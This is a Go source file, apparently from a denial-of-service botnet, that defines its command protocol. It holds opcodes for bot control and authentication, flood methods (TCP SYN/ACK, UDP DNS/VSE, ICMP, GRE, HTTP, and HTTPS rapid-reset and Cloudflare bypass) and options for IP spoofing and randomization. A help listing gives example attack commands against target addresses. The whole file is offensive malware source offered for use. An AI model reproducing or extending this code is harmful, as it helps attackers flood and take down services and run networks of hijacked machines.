package bot

const (
	CMD_PING         = 0x00
	CMD_PONG         = 0x01
	CMD_STOP         = 0x02
	CMD_IDENTITY     = 0x03
	CMD_STOP_TARGET  = 0x05
	CMD_SYSINFO_REQ  = 0x06
	CMD_SYSINFO_RESP = 0x07
	CMD_KILL         = 0x08

	CMD_HELLO         = 0x20
	CMD_CHALLENGE     = 0x21
	CMD_AUTH_RESPONSE = 0x22
	CMD_AUTH_OK       = 0x23
	CMD_AUTH_FAIL     = 0x24

	CMD_TCP   = 0x10
	CMD_UDP   = 0x11
	CMD_HTTP  = 0x12
	CMD_ICMP  = 0x13
	CMD_GRE   = 0x14
	CMD_HTTPS = 0x15

	OPT_MODE    = 0x01
	OPT_PSIZE   = 0x02
	OPT_SRCPORT = 0x03
	OPT_THREADS = 0x05
	OPT_PPS     = 0x06
	OPT_PAYLOAD = 0x07

	OPT_RAND  = 0x11
	OPT_FRAG  = 0x12
	OPT_TTL   = 0x13
	OPT_TOS   = 0x14
	OPT_SPOOF = 0x15

	OPT_TCPFLAGS = 0x20
	OPT_TCPOPTS  = 0x21
	OPT_CONNS    = 0x23

	OPT_METHOD      = 0x40
	OPT_PATH        = 0x41
	OPT_DOMAIN      = 0x42
	OPT_COOKIE      = 0x43
	OPT_REFERER     = 0x44
	OPT_USERAGENT   = 0x45
	OPT_UARAND      = 0x46
	OPT_RANDPATH    = 0x47
	OPT_POSTDATA    = 0x48
	OPT_KEEPALIVE   = 0x4A
	OPT_PIPELINE    = 0x4B
	OPT_RATE        = 0x4C

	MODE_TCP_SYN       = 0x00
	MODE_TCP_ACK       = 0x01
	MODE_TCP_HANDSHAKE = 0x02
	MODE_TCP_SOCKET    = 0x03

	MODE_UDP_PLAIN = 0x00
	MODE_UDP_VSE   = 0x01
	MODE_UDP_DNS   = 0x02

	MODE_HTTP_CFBYPASS = 0x00

	MODE_ICMP_ECHO = 0x00

	MODE_GRE_IP = 0x00

	MODE_HTTPS_FLOOD       = 0x00
	MODE_HTTPS_CFBYPASS    = 0x01
	MODE_HTTPS_RAPIDRESET  = 0x02
	MODE_HTTPS_BROWSER     = 0x03
)

var MethodMap = map[string]byte{
	"tcp":   CMD_TCP,
	"udp":   CMD_UDP,
	"http":  CMD_HTTP,
	"icmp":  CMD_ICMP,
	"gre":   CMD_GRE,
	"https": CMD_HTTPS,
}

var TcpModeMap = map[string]byte{
	"syn":       MODE_TCP_SYN,
	"ack":       MODE_TCP_ACK,
	"handshake": MODE_TCP_HANDSHAKE,
	"stomp":     MODE_TCP_SOCKET,
	"socket":    MODE_TCP_SOCKET,
}

var UdpModeMap = map[string]byte{
	"plain": MODE_UDP_PLAIN,
	"vse":   MODE_UDP_VSE,
	"dns":   MODE_UDP_DNS,
}

var HttpModeMap = map[string]byte{
	"cfbypass": MODE_HTTP_CFBYPASS,
}

var IcmpModeMap = map[string]byte{
	"echo": MODE_ICMP_ECHO,
}

var GreModeMap = map[string]byte{
	"ip": MODE_GRE_IP,
}

var HttpsModeMap = map[string]byte{
	"flood":       MODE_HTTPS_FLOOD,
	"cfbypass":    MODE_HTTPS_CFBYPASS,
	"rapidreset":  MODE_HTTPS_RAPIDRESET,
	"browser":     MODE_HTTPS_BROWSER,
}

var OptionMap = map[string]byte{
	"mode":      OPT_MODE,
	"psize":     OPT_PSIZE,
	"srcport":   OPT_SRCPORT,
	"threads":   OPT_THREADS,
	"pps":       OPT_PPS,
	"payload":   OPT_PAYLOAD,
	"rand":      OPT_RAND,
	"frag":      OPT_FRAG,
	"ttl":       OPT_TTL,
	"tos":       OPT_TOS,
	"spoof":     OPT_SPOOF,
	"tcpflags":  OPT_TCPFLAGS,
	"tcpopts":   OPT_TCPOPTS,
	"conns":     OPT_CONNS,
	"method":    OPT_METHOD,
	"path":      OPT_PATH,
	"domain":    OPT_DOMAIN,
	"cookie":    OPT_COOKIE,
	"referer":   OPT_REFERER,
	"useragent": OPT_USERAGENT,
	"ua":        OPT_USERAGENT,
	"uarand":    OPT_UARAND,
	"randpath":  OPT_RANDPATH,
	"postdata":  OPT_POSTDATA,
	"keepalive": OPT_KEEPALIVE,
	"pipeline":  OPT_PIPELINE,
	"rate":      OPT_RATE,
}

func GetMethods() []string {
	return []string{
		"",
		"=== LAYER 4 ATTACKS ===",
		"tcp  - TCP Attack (modes: syn, ack, handshake, stomp)",
		"     Options: mode, rand, frag, spoof, psize, srcport, tcpflags, tcpopts, conns, ttl, tos, pps",
		"",
		"udp  - UDP Attack [raw socket] (modes: plain, vse, dns)",
		"     Options: mode, rand, frag, spoof, psize, srcport, payload, ttl, tos, pps",
		"",
		"=== LAYER 7 ATTACKS ===",
		"http - HTTP Attack (modes: cfbypass)",
		"     Options: mode, method, domain, path, conns, keepalive, pipeline, cookie, referer,",
		"              useragent, uarand, randpath, postdata",
		"",
		"=== LAYER 3 ATTACKS ===",
		"icmp - ICMP Flood (echo)",
		"     Options: rand, frag, spoof, psize, ttl, tos, pps",
		"",
		"gre  - GRE Tunnel Flood (ip)",
		"     Options: rand, frag, spoof, psize, ttl, tos, pps",
		"",
		"=== LAYER 7 (TLS) ATTACKS ===",
		"https - HTTPS/TLS Attack (modes: flood, cfbypass, rapidreset, browser) [BearSSL]",
		"      Options: mode, domain, path, conns, useragent, uarand, cookie, referer,",
		"               keepalive, pipeline, postdata, randpath, method, rate",
		"",
		"=== BYPASS OPTIONS ===",
		"rand=0-3    Randomization (0=none, 1=basic, 2=medium, 3=full)",
		"frag=0-2    IP flags (0=none, 1=DF dont-fragment, 2=MF more-fragments)",
		"spoof=X     IP Spoofing (random, CIDR e.g. 10.0.0.0/24, range e.g. 10.0.0.1-10.0.0.254)",
		"pps=N       Packets per second limit (0=unlimited)",
		"threads=N   Parallel attack threads per command (bot max 4)",
		"",
		"=== EXAMPLES ===",
		"!tcp 1.2.3.4 80 60 mode=syn spoof=random",
		"!tcp 1.2.3.4 80 60 mode=handshake conns=256",
		"!udp 1.2.3.4 53 60 mode=dns spoof=192.168.1.0/24",
		"!udp 1.2.3.4 27015 60 mode=vse",
		"!http example.com 80 60 domain=example.com",
		"!https example.com 443 60 mode=cfbypass domain=example.com",
		"!https example.com 443 60 mode=rapidreset domain=example.com",
	}
}

func IsL3Attack(method string) bool {
	return method == "icmp" || method == "gre"
}

func GetModeValue(method string, modeName string) (byte, bool) {
	switch method {
	case "tcp":
		if val, ok := TcpModeMap[modeName]; ok {
			return val, true
		}
	case "udp":
		if val, ok := UdpModeMap[modeName]; ok {
			return val, true
		}
	case "http":
		if val, ok := HttpModeMap[modeName]; ok {
			return val, true
		}
	case "icmp":
		if val, ok := IcmpModeMap[modeName]; ok {
			return val, true
		}
	case "gre":
		if val, ok := GreModeMap[modeName]; ok {
			return val, true
		}
	case "https":
		if val, ok := HttpsModeMap[modeName]; ok {
			return val, true
		}
	}
	return 0, false
}
